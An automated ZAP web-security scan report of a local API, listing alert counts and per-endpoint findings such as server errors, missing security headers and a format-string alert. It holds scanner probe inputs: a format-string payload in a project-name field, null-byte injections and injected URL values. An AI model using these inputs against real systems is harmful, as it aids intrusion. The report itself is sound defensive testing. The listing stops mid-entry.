# ZAP Scanning Report

ZAP by [Checkmarx](https://checkmarx.com/).


## Summary of Alerts

| Risk Level | Number of Alerts |
| --- | --- |
| High | 0 |
| Medium | 1 |
| Low | 4 |
| Informational | 5 |




## Insights

| Level | Reason | Site | Description | Statistic |
| --- | --- | --- | --- | --- |
| Low | Warning |  | ZAP warnings logged - see the zap.log file for details | 106    |
| Low | Exceeded High | http://host.docker.internal:8000 | Percentage of responses with status code 4xx | 94 % |
| Info | Informational | http://host.docker.internal:8000 | Percentage of responses with status code 2xx | 3 % |
| Info | Informational | http://host.docker.internal:8000 | Percentage of responses with status code 5xx | 1 % |
| Info | Informational | http://host.docker.internal:8000 | Percentage of endpoints with content type application/json | 99 % |
| Info | Informational | http://host.docker.internal:8000 | Percentage of endpoints with method DELETE | 1 % |
| Info | Informational | http://host.docker.internal:8000 | Percentage of endpoints with method GET | 49 % |
| Info | Informational | http://host.docker.internal:8000 | Percentage of endpoints with method PATCH | 15 % |
| Info | Informational | http://host.docker.internal:8000 | Percentage of endpoints with method POST | 30 % |
| Info | Informational | http://host.docker.internal:8000 | Percentage of endpoints with method PUT | 2 % |
| Info | Informational | http://host.docker.internal:8000 | Count of total endpoints | 916    |
| Info | Informational | http://host.docker.internal:8000 | Percentage of slow responses | 1 % |







## Alerts

| Name | Risk Level | Number of Instances |
| --- | --- | --- |
| Format String Error | Medium | 1 |
| A Server Error response code was returned by the server | Low | 22 |
| Cross-Origin-Resource-Policy Header Missing or Invalid | Low | Systemic |
| Unexpected Content-Type was returned | Low | 1 |
| X-Content-Type-Options Header Missing | Low | Systemic |
| A Client Error response code was returned by the server | Informational | 932 |
| Information Disclosure - Sensitive Information in URL | Informational | Systemic |
| Non-Storable Content | Informational | Systemic |
| Session Management Response Identified | Informational | 1 |
| Storable and Cacheable Content | Informational | 2 |




## Alert Detail



### [ Format String Error ](https://www.zaproxy.org/docs/alerts/30002/)



##### Medium (Medium)

### Description

A Format String error occurs when the submitted data of an input string is evaluated as a command by the application.

* URL: http://host.docker.internal:8000/api/projects/10
  * Node Name: `http://host.docker.internal:8000/api/projects/10 ()({project_name,project_details,project_status,modified_by})`
  * Method: `PATCH`
  * Parameter: `project_name`
  * Attack: `ZAP %1!s%2!s%3!s%4!s%5!s%6!s%7!s%8!s%9!s%10!s%11!s%12!s%13!s%14!s%15!s%16!s%17!s%18!s%19!s%20!s%21!n%22!n%23!n%24!n%25!n%26!n%27!n%28!n%29!n%30!n%31!n%32!n%33!n%34!n%35!n%36!n%37!n%38!n%39!n%40!n
`
  * Evidence: ``
  * Other Info: `Potential Format String Error. The script closed the connection on a Microsoft format string error.`


Instances: 1

### Solution

Rewrite the background program using proper deletion of bad character strings. This will require a recompile of the background executable.

### Reference


* [ https://owasp.org/www-community/attacks/Format_string_attack ](https://owasp.org/www-community/attacks/Format_string_attack)


#### CWE Id: [ 134 ](https://cwe.mitre.org/data/definitions/134.html)


#### WASC Id: 6

#### Source ID: 1

### [ A Server Error response code was returned by the server ](https://www.zaproxy.org/docs/alerts/100000/)



##### Low (High)

### Description

A response code of 502 was returned by the server.
This may indicate that the application is failing to handle unexpected input correctly.
Raised by the 'Alert on HTTP Response Code Error' script

* URL: http://host.docker.internal:8000/api/admin/lifecycle-vendor-records%3Fsearch=%2500&status=&ecosystem=&limit=50&offset=0
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-vendor-records (ecosystem,limit,offset,search,status)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `500`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/ai/copilot/briefing
  * Node Name: `http://host.docker.internal:8000/api/ai/copilot/briefing`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `502`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/ai/copilot/briefing%3Fforce=false
  * Node Name: `http://host.docker.internal:8000/api/ai/copilot/briefing (force)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `502`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/ai/copilot/briefing/
  * Node Name: `http://host.docker.internal:8000/api/ai/copilot/briefing/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `502`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/lifecycle/component/8822425293788040397
  * Node Name: `http://host.docker.internal:8000/api/lifecycle/component/8822425293788040397`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `500`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/products/5624312283239641685
  * Node Name: `http://host.docker.internal:8000/api/products/5624312283239641685`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `500`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/6008060614489138851
  * Node Name: `http://host.docker.internal:8000/api/projects/6008060614489138851`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `500`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/remediation/finding/7475423240259726430
  * Node Name: `http://host.docker.internal:8000/api/remediation/finding/7475423240259726430`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `500`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/remediation/project/7148092421956100551
  * Node Name: `http://host.docker.internal:8000/api/remediation/project/7148092421956100551`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `500`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/runs/3362330085393868531
  * Node Name: `http://host.docker.internal:8000/api/runs/3362330085393868531`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `500`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/runs/search%3Fq=%2500&limit=20
  * Node Name: `http://host.docker.internal:8000/api/runs/search (limit,q)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `500`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/7833799740919000086
  * Node Name: `http://host.docker.internal:8000/api/sboms/7833799740919000086`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `500`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/credentials/7628071043842219256
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/credentials/7628071043842219256`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `500`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10
  * Node Name: `http://host.docker.internal:8000/api/projects/10 ()({project_name,project_details,project_status,modified_by})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `500`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10/
  * Node Name: `http://host.docker.internal:8000/api/projects/10/ ()({project_name,project_details,project_status,modified_by})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `500`
  * Other Info: ``
* URL: http://host.docker.internal:8000/admin/nvd-mirror/sync
  * Node Name: `http://host.docker.internal:8000/admin/nvd-mirror/sync`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `503`
  * Other Info: ``
* URL: http://host.docker.internal:8000/admin/nvd-mirror/sync/
  * Node Name: `http://host.docker.internal:8000/admin/nvd-mirror/sync/`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `503`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/ai/copilot/ask
  * Node Name: `http://host.docker.internal:8000/api/ai/copilot/ask ()({question})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `502`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/ai/copilot/ask/
  * Node Name: `http://host.docker.internal:8000/api/ai/copilot/ask/ ()({question})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `502`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects
  * Node Name: `http://host.docker.internal:8000/api/projects ()({project_name,project_details,project_status,created_by})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `500`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/
  * Node Name: `http://host.docker.internal:8000/api/projects/ ()({project_name,project_details,project_status,created_by})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `500`
  * Other Info: ``
* URL: http://host.docker.internal:8000/admin/nvd-mirror/settings
  * Node Name: `http://host.docker.internal:8000/admin/nvd-mirror/settings ()({enabled,api_endpoint,api_key,clear_api_key,download_feeds_enabled,page_size,window_days,min_freshness_hours})`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `503`
  * Other Info: ``


Instances: 22

### Solution



### Reference



#### CWE Id: [ 388 ](https://cwe.mitre.org/data/definitions/388.html)


#### WASC Id: 20

#### Source ID: 4

### [ Cross-Origin-Resource-Policy Header Missing or Invalid ](https://www.zaproxy.org/docs/alerts/90004/)



##### Low (Medium)

### Description

Cross-Origin-Resource-Policy header is an opt-in header designed to counter side-channels attacks like Spectre. Resource should be specifically set as shareable amongst different origins.

* URL: http://host.docker.internal:8000/
  * Node Name: `http://host.docker.internal:8000/`
  * Method: `GET`
  * Parameter: `Cross-Origin-Resource-Policy`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/analysis/config
  * Node Name: `http://host.docker.internal:8000/api/analysis/config`
  * Method: `GET`
  * Parameter: `Cross-Origin-Resource-Policy`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/types
  * Node Name: `http://host.docker.internal:8000/api/types`
  * Method: `GET`
  * Parameter: `Cross-Origin-Resource-Policy`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: http://host.docker.internal:8000/health
  * Node Name: `http://host.docker.internal:8000/health`
  * Method: `GET`
  * Parameter: `Cross-Origin-Resource-Policy`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/analyze/stream
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/analyze/stream ()({sources:[]})`
  * Method: `POST`
  * Parameter: `Cross-Origin-Resource-Policy`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``

Instances: Systemic


### Solution

Ensure that the application/web server sets the Cross-Origin-Resource-Policy header appropriately, and that it sets the Cross-Origin-Resource-Policy header to 'same-origin' for all web pages.
'same-site' is considered as less secured and should be avoided.
If resources must be shared, set the header to 'cross-origin'.
If possible, ensure that the end user uses a standards-compliant and modern web browser that supports the Cross-Origin-Resource-Policy header (https://caniuse.com/mdn-http_headers_cross-origin-resource-policy).

### Reference


* [ https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Embedder-Policy ](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Embedder-Policy)


#### CWE Id: [ 693 ](https://cwe.mitre.org/data/definitions/693.html)


#### WASC Id: 14

#### Source ID: 3

### [ Unexpected Content-Type was returned ](https://www.zaproxy.org/docs/alerts/100001/)



##### Low (High)

### Description

A Content-Type of text/event-stream was returned by the server.
This is not one of the types expected to be returned by an API.
Raised by the 'Alert on Unexpected Content Types' script

* URL: http://host.docker.internal:8000/api/sboms/10/analyze/stream
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/analyze/stream ()({sources:[]})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `text/event-stream`
  * Other Info: ``


Instances: 1

### Solution



### Reference




#### Source ID: 4

### [ X-Content-Type-Options Header Missing ](https://www.zaproxy.org/docs/alerts/10021/)



##### Low (Medium)

### Description

The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.

* URL: http://host.docker.internal:8000/
  * Node Name: `http://host.docker.internal:8000/`
  * Method: `GET`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`
* URL: http://host.docker.internal:8000/api/analysis/config
  * Node Name: `http://host.docker.internal:8000/api/analysis/config`
  * Method: `GET`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`
* URL: http://host.docker.internal:8000/api/types
  * Node Name: `http://host.docker.internal:8000/api/types`
  * Method: `GET`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`
* URL: http://host.docker.internal:8000/health
  * Node Name: `http://host.docker.internal:8000/health`
  * Method: `GET`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`
* URL: http://host.docker.internal:8000/openapi.json
  * Node Name: `http://host.docker.internal:8000/openapi.json`
  * Method: `GET`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`

Instances: Systemic


### Solution

Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.
If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.

### Reference


* [ https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622941(v=vs.85) ](https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622941(v=vs.85))
* [ https://owasp.org/www-community/Security_Headers ](https://owasp.org/www-community/Security_Headers)


#### CWE Id: [ 693 ](https://cwe.mitre.org/data/definitions/693.html)


#### WASC Id: 15

#### Source ID: 3

### [ A Client Error response code was returned by the server ](https://www.zaproxy.org/docs/alerts/100000/)



##### Informational (High)

### Description

A response code of 422 was returned by the server.
This may indicate that the application is failing to handle unexpected input correctly.
Raised by the 'Alert on HTTP Response Code Error' script

* URL: http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/secret/secret_name
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/secret/secret_name`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/secret/secret_name/
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/secret/secret_name/`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/products/10
  * Node Name: `http://host.docker.internal:8000/api/products/10`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/products/10/
  * Node Name: `http://host.docker.internal:8000/api/products/10/`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/products/10/schedule
  * Node Name: `http://host.docker.internal:8000/api/products/10/schedule`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/products/10/schedule%3Fpermanent=false&user_id=
  * Node Name: `http://host.docker.internal:8000/api/products/10/schedule (permanent,user_id)`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/products/10/schedule%3Fpermanent=http%253A%252F%252Fwww.google.com%252F&user_id=
  * Node Name: `http://host.docker.internal:8000/api/products/10/schedule (permanent,user_id)`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/products/10/schedule/
  * Node Name: `http://host.docker.internal:8000/api/products/10/schedule/`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10%3Fconfirm=no&permanent=false
  * Node Name: `http://host.docker.internal:8000/api/projects/10 (confirm,permanent)`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10%3Fconfirm=no&permanent=http%253A%252F%252Fwww.google.com%252F
  * Node Name: `http://host.docker.internal:8000/api/projects/10 (confirm,permanent)`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10/schedule%3Fpermanent=false&user_id=
  * Node Name: `http://host.docker.internal:8000/api/projects/10/schedule (permanent,user_id)`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10/schedule%3Fpermanent=http%253A%252F%252Fwww.google.com%252F&user_id=
  * Node Name: `http://host.docker.internal:8000/api/projects/10/schedule (permanent,user_id)`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10
  * Node Name: `http://host.docker.internal:8000/api/sboms/10`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10%3Fconfirm=no&permanent=false
  * Node Name: `http://host.docker.internal:8000/api/sboms/10 (confirm,permanent)`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10%3Fconfirm=no&permanent=http%253A%252F%252Fwww.google.com%252F
  * Node Name: `http://host.docker.internal:8000/api/sboms/10 (confirm,permanent)`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/schedule
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/schedule`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/schedule%3Fpermanent=false&user_id=
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/schedule (permanent,user_id)`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/schedule%3Fpermanent=http%253A%252F%252Fwww.google.com%252F&user_id=
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/schedule (permanent,user_id)`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/schedule/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/schedule/`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/credentials/10
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/credentials/10`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/credentials/10/
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/credentials/10/`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/6858605872111550832
  * Node Name: `http://host.docker.internal:8000/6858605872111550832`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/actuator/health
  * Node Name: `http://host.docker.internal:8000/actuator/health`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/admin
  * Node Name: `http://host.docker.internal:8000/admin`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/admin/
  * Node Name: `http://host.docker.internal:8000/admin/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/admin/7693085326416067008
  * Node Name: `http://host.docker.internal:8000/admin/7693085326416067008`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/admin/nvd-mirror
  * Node Name: `http://host.docker.internal:8000/admin/nvd-mirror`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/admin/nvd-mirror/
  * Node Name: `http://host.docker.internal:8000/admin/nvd-mirror/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/admin/nvd-mirror/3797497812097807245
  * Node Name: `http://host.docker.internal:8000/admin/nvd-mirror/3797497812097807245`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/admin/nvd-mirror/sync
  * Node Name: `http://host.docker.internal:8000/admin/nvd-mirror/sync`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `405`
  * Other Info: ``
* URL: http://host.docker.internal:8000/admin/nvd-mirror/sync/
  * Node Name: `http://host.docker.internal:8000/admin/nvd-mirror/sync/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `405`
  * Other Info: ``
* URL: http://host.docker.internal:8000/admin/nvd-mirror/sync/35692612309846667
  * Node Name: `http://host.docker.internal:8000/admin/nvd-mirror/sync/35692612309846667`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/admin/nvd-mirror/watermark
  * Node Name: `http://host.docker.internal:8000/admin/nvd-mirror/watermark`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/admin/nvd-mirror/watermark/
  * Node Name: `http://host.docker.internal:8000/admin/nvd-mirror/watermark/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/admin/nvd-mirror/watermark/4336892866878922728
  * Node Name: `http://host.docker.internal:8000/admin/nvd-mirror/watermark/4336892866878922728`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api
  * Node Name: `http://host.docker.internal:8000/api`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/
  * Node Name: `http://host.docker.internal:8000/api/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/1642091290565573297
  * Node Name: `http://host.docker.internal:8000/api/1642091290565573297`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin
  * Node Name: `http://host.docker.internal:8000/api/admin`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/
  * Node Name: `http://host.docker.internal:8000/api/admin/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/9058704541714741856
  * Node Name: `http://host.docker.internal:8000/api/admin/9058704541714741856`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/lifecycle-providers/2440381299014131981
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-providers/2440381299014131981`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `405`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `405`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `405`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/1812975537034921952
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/1812975537034921952`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/secret
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/secret`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `405`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/secret/
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/secret/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `405`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/secret/6305511898282992340
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-providers/provider_key/secret/6305511898282992340`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `405`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/lifecycle-vendor-records%3Fsearch=ZAP&status=&ecosystem=&limit=http%253A%252F%252Fwww.google.com%252F&offset=0
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-vendor-records (ecosystem,limit,offset,search,status)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/admin/lifecycle-vendor-records/3555299930109370180
  * Node Name: `http://host.docker.internal:8000/api/admin/lifecycle-vendor-records/3555299930109370180`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `405`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/ai
  * Node Name: `http://host.docker.internal:8000/api/ai`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/ai/
  * Node Name: `http://host.docker.internal:8000/api/ai/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/ai/5744106470667980318
  * Node Name: `http://host.docker.internal:8000/api/ai/5744106470667980318`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/ai/copilot
  * Node Name: `http://host.docker.internal:8000/api/ai/copilot`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/ai/copilot/
  * Node Name: `http://host.docker.internal:8000/api/ai/copilot/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/ai/copilot/1095039458555690394
  * Node Name: `http://host.docker.internal:8000/api/ai/copilot/1095039458555690394`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/ai/copilot/briefing%3Fforce=http%253A%252F%252Fwww.google.com%252F
  * Node Name: `http://host.docker.internal:8000/api/ai/copilot/briefing (force)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/analysis
  * Node Name: `http://host.docker.internal:8000/api/analysis`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/analysis-runs
  * Node Name: `http://host.docker.internal:8000/api/analysis-runs`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/analysis-runs/
  * Node Name: `http://host.docker.internal:8000/api/analysis-runs/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/analysis-runs/10
  * Node Name: `http://host.docker.internal:8000/api/analysis-runs/10`
  * Method: `GET`
